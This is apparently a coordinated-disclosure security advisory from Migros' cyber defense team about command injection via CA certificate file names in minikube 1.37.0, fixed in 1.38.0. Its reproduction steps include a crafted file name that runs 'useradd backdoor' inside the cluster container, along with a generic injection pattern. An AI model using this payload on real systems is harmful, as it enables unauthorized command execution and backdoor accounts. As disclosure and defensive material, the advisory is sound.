# Migros Security Advisory
This is a security advisory published by the Security Operations / Cyber Defense Center team of MGB (Migros-Genossenschafts-Bund) found during penetration tests or red team engagements.

## Kubernetes SIG minikube - Command injection through certificate file names
| Key | Value |
| --- | --- |
| Vendor | Kubernetes SIG |
| Product | minikube |
| Vulnerability | Command Injection |
| Affected Versions | 1.37.0 |
| URL | [https://minikube.sigs.k8s.io/](https://minikube.sigs.k8s.io/) |
| CVSS 4.0 | 6.2 |
| CWE | CWE-78 |
| CAPEC | CAPEC-88, CAPEC-242 |
| MSEC ID | MSEC-2026-001 |
| Vendor ID | 3423233 (HackerOne) |
| CVE ID | Pending |

## Table of Contents
1. Summary
2. Details
3. Workaround and Fix
4. Credits
5. Timeline
6. References
7. About Us
8. Disclaimer

## 1. Summary
minikube does not properly sanitize file names before using them in dynamically generated commands, allowing attackers to exploit this flaw for command injection inside the Kubernetes cluster container during its creation process.


## 2. Details
minikube creates a container on the host machine that acts as a Kubernetes cluster (Pod containers are created inside this cluster container). It contains a feature to trust CA PEM files, to enable it to run on proxy environments with TLS inspection. The file names of these PEM files are used inside commands and are not escaped correctly.

Users can store PEM files in a specific directory (`~/.minikube/certs/`). minikube copies and links those files inside the cluster during its setup (see [Minikube Handbook: Proxies and VPNs](https://minikube.sigs.k8s.io/docs/handbook/vpn_and_proxy/)).

The file names are used inside commands and are not encoded and/or escaped properly for this target context. The crafted commands are executed within the cluster container.

> Do not execute these steps on a Minikube installation containing productive data, as the cluster will be recreated!

#### Reproduction Steps
1. Create a Minikube cluster: run `minikube start` to initialize the folder structure.
2. Prepare a valid PEM file: generate a PEM file using the following command and use `out.pem` for testing. **The content of the PEM is not relevant**.
```sh
cd ~/.minikube/certs/
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out out.pem -days 365 -nodes -subj "/CN=default"
```
3. Craft a malicious file name (see below for details)
```sh
mv out.pem ';useradd backdoor; echo x.pem'
```
4. Recreate the minikube cluster: `minikube delete && minikube start`

#### Verification
Log into the minikube container and verify that the command was run:
```sh
$ docker exec -ti minikube sh
$ cat /etc/passwd | grep backdoor
backdoor:x:1001:1001::/home/backdoor:/bin/sh
```

#### Command Injection Pattern
The pattern is:
```sh
;$CMD; echo x.pem
```

File names are embedded into shell commands, such as the following. These can be found in error messages when certain file name patterns used (this vulnerability was initially discovered with a file name containing a space)
```sh
sudo mkdir -p /usr/share/ca-certificates && sudo scp -t /usr/share/ca-certificates && sudo touch -d "<current timestamp>" /usr/share/ca-certificates/<file-name>
test -s /usr/share/ca-certificates/<file-name> && ln -fs /usr/share/ca-certificates/<file-name> /etc/ssl/certs/<file-name>
```

#### Constraints
- File names must end with `.pem` or `.crt`.
- Files must be at least 32 bytes and contain valid PEM certificate data.
- Since `$CMD` is part of a file name, characters like `/` are not allowed
- Relevant code:
	- [`collectCACerts()`](https://github.com/kubernetes/minikube/blob/420fe34e8fb92dbc811df88b42b75938e3887f48/pkg/minikube/bootstrapper/certs.go#L456)
  - [`isValidPEMCertificate()`](https://github.com/kubernetes/minikube/blob/420fe34e8fb92dbc811df88b42b75938e3887f48/pkg/minikube/bootstrapper/certs.go#L430)


## 3. Workaround and Fix
The following chapter describes how the reported vulnerability can be mitigated (e.g., using a workaround) and if available sustainably fixed.
### Workaround
Ensure that attackers cannot create/rename files on the host system and trigger a cluster container recreation.


### Fix
All commands containing user-supplied data must be properly neutralized for the target context, usually through output encoding.
Version 1.38.0 fixes this vulnerability.



## 4. Credits
- Lukas Röllin, MGB (Migros Genossenschafts-Bund)

## 5. Timeline
| Date | Process | Comments |
| --- | --- | --- |
| 03-11-2025 | Vulnerability Discovery | n/a |
| 12-11-2025 | Vendor Notification | n/a |
| 12-11-2025 | Vendor Receipt | n/a |
| 13-11-2025 | Vendor Validation | by HackerOne staff, pending validation from Kubernetes |
| 16-11.2025 | Vendor Validation | by Kubernetes staff |
| 24-11-2025 | CVE Request | CVE Request initiated by Kubernetes staff |
| 20-02-2026 | Vendor Resolution | Confirmation of Patch by Kubernetes staff, no CVE issued |
| 26-02-2026 | Advisory Release | Release of Advisory, CVE Request by Migros is pending |

## 6. References
- [https://github.com/migros/migros-security-advisories/blob/main/advisories/msec-2026-001_kubernetes-sig_minikube_command-injection.md](https://github.com/migros/migros-security-advisories/blob/main/advisories/msec-2026-001_kubernetes-sig_minikube_command-injection.md)
- [https://github.com/migros/migros-security-advisories/](https://github.com/migros/migros-security-advisories/)
- [https://minikube.sigs.k8s.io/](https://minikube.sigs.k8s.io/)
- [https://hackerone.com/lukasroellinmgb?type=user](https://hackerone.com/lukasroellinmgb?type=user)

## 7. About Us
The MGB (Migros-Genossenschafts-Bund) is the central service company of the Migros Group and offers around 350 different functions. For this reason, we are always on the lookout for specialists from a wide range of fields. You can find us on [jobs.migros.ch](https://migros-gruppe.jobs/de/unsere-unternehmen/migros-gruppe/offene-stellen?q=cyber).


## 8. Disclaimer
The MGB (Migros-Genossenschafts-Bund) works with suppliers to mitigate identified vulnerabilities as best as possible. The publication of vulnerabilities without the availability of a suitable corrective measure (patch) is not the goal of the MGB. The full disclosure of a vulnerability is only used by MGB in exceptional cases. The protection of the Migros community, especially those who are in a contractual relationship, must be guaranteed in any case and MGB will act in their interests.


